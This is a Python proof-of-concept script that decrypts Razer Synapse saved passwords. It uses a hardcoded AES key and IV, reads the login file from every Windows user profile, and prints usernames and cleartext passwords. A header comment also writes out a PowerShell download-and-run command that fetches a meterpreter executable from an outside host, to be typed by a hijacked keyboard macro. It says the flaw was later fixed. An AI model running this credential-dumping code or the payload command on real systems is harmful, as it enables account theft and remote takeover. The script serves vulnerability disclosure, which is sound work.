#
# Razer_decode.py
# >Razer Synapse (rzSynapse) Password Decryption Proof of Concept
# >Author: pasv (Matt Howard) - themdhoward[at]gmail[dot]com
# >Site: www.dreaminhex.com

# PyCrypto can be downloaded and installed from:
# https://www.dlitz.net/software/pycrypto/
# binary version: http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# 
# Razer updated to 1.7.15 fixing this issue on 12/27/12
#

# Why Razer passwords are a security issue
# ======================================================
# -password re-use accross other accounts (obvious)
# -the ability to update someone's cloud settings for their Razer keyboards/mice
#   essentially means you can update any of their keys to trigger macro payloads on any other system they login from.
#   -Example, forcing the next session to macro type: "[ctrl+esc]powershell[delay 5 seconds maybe?]
#     "(new-object System.Net.WebClient).DownloadFile('http://dreaminhex.com/meterpreter.exe','%TEMP%\m.exe'); Start-Process "%TEMP%\m.exe"
#    note: these can be executed after a significant delay and the keys you enter or the payload you upload could revert their settings back easily
# if you had access you could do this locally but having a login allows you to do this at anytime remotely if they update from cloud settings from the prompt


import base64
import os
import re
from Crypto.Cipher import AES


# These are hardcoded and don't appear to change with versions
# Last version tested: Razer Synapse 2.0 (file version: 1.6.1.10587)
key = "hcxilkqbbhczfeultgbskdmaunivmfuo"
iv = "ryojvlzmdalyglrj"
enc = AES.new(key, AES.MODE_CBC, iv)


def removeBytes(s):
    return "".join(i for i in s if ord(i) < 128 and ord(i) >= 48)


def decrypt(ciphertext):
    cleartext = enc.decrypt(base64.b64decode(ciphertext))
    cleartext = removeBytes(cleartext)
    pos = cleartext.find("||")
    return cleartext[pos + 2:]


def show_loot(logindata):
    print "[+] Decrypting passwords..."
    lines = logindata.split("</SavedCredentials>")
    for line in lines:
        match_user = re.search("<Username>([^<]+)</Username>", line)
        match_pass = re.search("<Password>([^<]+)</Password>", line)
        if match_user:
            print "[+] Username: " + match_user.groups(1)[0]
        if match_pass:
            print "[~] Encrypted password: " + match_pass.groups(1)[0]
            print "[+] Password: " + \
                decrypt(match_pass.groups(1)[0])
            print "==============================="


if __name__ == "__main__":
    print "Razer Synapse (rzSynapse) Password Decryption Proof of Concept"
    print "Author: pasv (Matt Howard) - themdhoward[at]gmail[dot]com\n\n"
    print "[] Fetching password files"
    for d in os.listdir("C:\\Users"):
        try:
            #print "[!] Attempting to access accounts for: " + d
            #print "[] Fetching encrypted passwords from " + \
            #    d + "\\AppData\\Local\Razer\\Synapse\\Accounts\\RazerLoginData.xml"
            loginxml = open("C:\\Users\\" + d + \
                "\\AppData\\Local\\Razer\\Synapse\\Accounts\\" + \
                "RazerLoginData.xml").read()
            show_loot(loginxml)
        except:
		    pass
            #print "[-] Failed to open accounts for: " + d


